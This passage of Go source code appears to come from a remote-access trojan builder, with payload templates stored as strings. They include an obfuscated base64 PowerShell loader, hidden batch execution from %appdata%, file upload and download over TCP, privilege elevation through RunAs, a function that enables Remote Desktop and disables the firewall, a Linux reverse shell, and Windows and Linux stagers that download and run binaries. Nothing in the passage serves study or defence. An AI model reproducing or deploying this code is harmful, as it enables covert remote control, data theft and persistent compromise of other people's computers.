(,$([Convert]::FromBase64String(\\\"nVRtc9pGEP7Or9jRXGekMZIFuMSg8UwcHDe0wXENsdMyTOeQFnTx6U4+nQyY8N+7wiomX8uHO3a1u8+zb8ee4ALeO43plZTDLNfGus4jGoWy0w4SKR1vBnk5lyKGwnJLF64tfYehsrfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSFZjcUL1sLi1ZZCaTXZ5G/qW6MtxtaL/jeXgUFucZLSlbxxeZUvrTViXlo8ImV5/PjK7GBMOmMP7A/qW254hoR1cN5jUQrXki+PLV/Rhgml4bxvWLPZsoQq7Fx+GFx9vP7t0/D3Pz6Pbr7c/nk3nny9f/j21998Hie4WKbi+6PMlM6fTGHL59V68xK22p2zX7vvzntOMNGDlJtLY/jG9RqLUsUVOsQue/a2YNCWVAfXnRK76WwG7PlnD/gBI+RFadD/Mv9OZQZ/XGZeQAf8AuG6FYbg4xP02t7uLbqFLVtU7J2oFQSdHwtNycWpr/ch6NvJBbBk6i7R+oarRGfgZ3wtMorKkuAzqqVNvdkuqvmxRXQUHWELudExlRq2U14RnbE1wdFxAuyfXQSoEqKwJvYFTUONC1tX4eo/4W6P6wWKZsH1drsjgOUWiDG4TFyEERPgSwvdM/p3cuJtWUpINmKPFWBCCBgB1AmSiwRBfB/JrqgM0oqRjEAswKWaF54Hh6qTBcHWgtN7/vbVoTSnN2iDMZpnEeOtpraMuOJLNLN+v9KiGaCxYiFoE/CeS5Hsx2nApZzTWBLmlllT4i5iGQk3lHDduPGmsJgFVfgHnA+kQGWjBsuCTzR4aIqAxtd1ygKNT3jKOk1wRvpFSMlPz4KQ+OssJ7C5pIxH4+FH6AatCB4E1XFVwM3Ec7yIKQJdRjD9sLG4H6i8KkMWXOmVkponV9xy10mtzYv+6Wmr1w5a3fOAzt67/jn9TplywGswTW5EyK9WnYYDszmaK1wIJfYtYk/g39BqgUP4nbYDviKpyHmMsNdc180swM95UdjUlA22vmC63//p6QmbLK8HrhmuO2EY0nUWetG0rtddqazIMKBNRaPzujNFMOKmSLmktgx0vnFZ3oSwCdPXhZ65bE2LREKn7XpeEw4gVWrkcvziEGKTrZvVFVYLp0vrq1LS1OxfFX8sEXPaO4w1jfV59ywMd9T9ON3u/gU=\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")"));
  runtime.GC();
  custom_command := ("move windll.bat " + "%" + "appdata"+"%");
  cmd := exec.Command("cmd", "/C", custom_command);
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  cmd.Run();
  runtime.GC();
  custom_command = ("%"+"appdata"+"%"+"/windll.bat");
  cmd = exec.Command("cmd", "/C", custom_command);
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  cmd.Run();
  cmd = exec.Command("cmd", "/C", "windll.bat");
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  cmd.Run();
};


func DOWNLOAD_VIA_TCP() {
  for {
    connect, err := net.Dial("tcp", VICTIM_IP+":"+"55888");
    if err != nil {
      UPLOAD_VIA_TCP();
    };
    file_name := strings.Split(Global__Command, "\"");
    file, _ := os.Open(file_name[1]);
    defer file.Close();
    io.Copy(connect, file);
    connect.Close();
    break;
  };
};


func UPLOAD_VIA_TCP() {
  connect, err := net.Dial("tcp", VICTIM_IP+":"+"55888");
  if err != nil {
    UPLOAD_VIA_TCP();
  };
  file_name := strings.Split(Global__Command, "\"");
  file, _ := os.Create(file_name[1]);
  file_name[1] = strings.Trim(file_name[1], " ");
  defer file.Close();
  io.Copy(file, connect);
  file.Close();
  connect.Close();
};


func SAY_PLEASE() (string){
  Command := strings.Split(Global__Command, "\"");
  cmd := exec.Command("cmd", "/C", string("powershell.exe -Command Start-Process -Verb RunAs "+string(Command[1])));
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  out, _ := cmd.Output();
  Command_Output := string(string(out)+" £> ");
  return Command_Output;
};



func REMOTE_DESKTOP() (bool) {

  var Status bool = true;
  Enable_RD := "reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f";
  Enable_RD_2 := "reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f";
  runtime.GC();
  E_RD := exec.Command("cmd", "/C", string(Enable_RD));
  E_RD.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  E_RD.Run();
  runtime.GC();
  E_RD_2 := exec.Command("cmd", "/C", string(Enable_RD_2));
  E_RD_2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  E_RD_2.Run();
  runtime.GC();
  Start_TermService_1 := exec.Command("cmd", "/C", "sc config TermService start= auto");
  Start_TermService_1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Service_Output_1, _ := Start_TermService_1.Output();
  if strings.Contains(string(Service_Output_1), "denied.") {
    Status = false
  }
  runtime.GC();
  Start_TermService_2 := exec.Command("cmd", "/C", "net start Termservice");
  Start_TermService_2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Start_TermService_2.Run();
  runtime.GC();
  Disable_FW := exec.Command("cmd", "/C", "netsh firewall set opmode disable");
  Disable_FW.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  FW_Output, _ := Disable_FW.Output();
  runtime.GC();
  if strings.Contains(string(FW_Output), "(Run as administrator)."){
    Status = false
  }
  return Status
}`




var LINUX_PAYLOAD string = `
package main


 
import"os/exec"
import"net"
import "time"
import "path/filepath"
import "os"

const VICTIM_IP string = "127.0.0.1";
const VICTIM_PORT string = "8552";

func main(){
    connect, err :=net.Dial("tcp",VICTIM_IP+":"+VICTIM_PORT);
    if err != nil {                                                                                           
      time.Sleep(15*time.Second);                                                             
      main();                                    
    }; 
    dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));     
    version_check := exec.Command("sh", "-c", "uname -a");
    version, _ := version_check.Output();           
    SysGuide := (string(dir) + " // " + string(version) + " // ");   
    connect.Write([]byte(string(SysGuide)))
    cmd:=exec.Command("/bin/sh");
    cmd.Stdin=connect;
    cmd.Stdout=connect;
    cmd.Stderr=connect;
    cmd.Run();
}`


var WIN_STAGER_PAYLOAD string = `

package main


import "os"
import "net"
import "time"
import "io"
import "os/exec"
import "runtime"
import "syscall"

const VICTIM_IP = "127.0.0.1";
const VICTIM_PORT = "8552";

func main() {
  
  Connect, err := net.Dial("tcp", VICTIM_IP+":"+VICTIM_PORT);
  if err != nil {                                                                                                                            
    time.Sleep(5*time.Second);                                                             
    main();                                    
  };
  file, _ := os.Create("windll.exe");
  io.Copy(file, Connect);
  runtime.GC()
  Move_String := string("move windll.exe "+"%"+"appdata"+"%")
  Move := exec.Command("cmd", "/C", Move_String);
  Move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Move.Run()
  Execute_String := string("%"+"appdata"+"%"+"\\windll.exe")
  Execute := exec.Command("cmd", "/C", Execute_String);
  Execute.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Execute.Run()
}`


var LINUX_STAGER_PAYLOAD string = `

package main


import "os"
import "net"
import "time"
import "io"
import "os/exec"
import "runtime"
import "syscall"

const VICTIM_IP = "127.0.0.1";
const VICTIM_PORT = "8552";

func main() {
  
  Connect, err := net.Dial("tcp", VICTIM_IP+":"+VICTIM_PORT);
  if err != nil {                                                                                                                            
    time.Sleep(5*time.Second);                                                             
    main();                                    
  };
  file, _ := os.Create("linuxlib");
  io.Copy(file, Connect);
  runtime.GC()
  exec.Command("sh", "-c", "chmod 777 linuxlib")
  Execute := exec.Command("cmd", "/C", ./linuxlib);
  Execute.Run()
}`
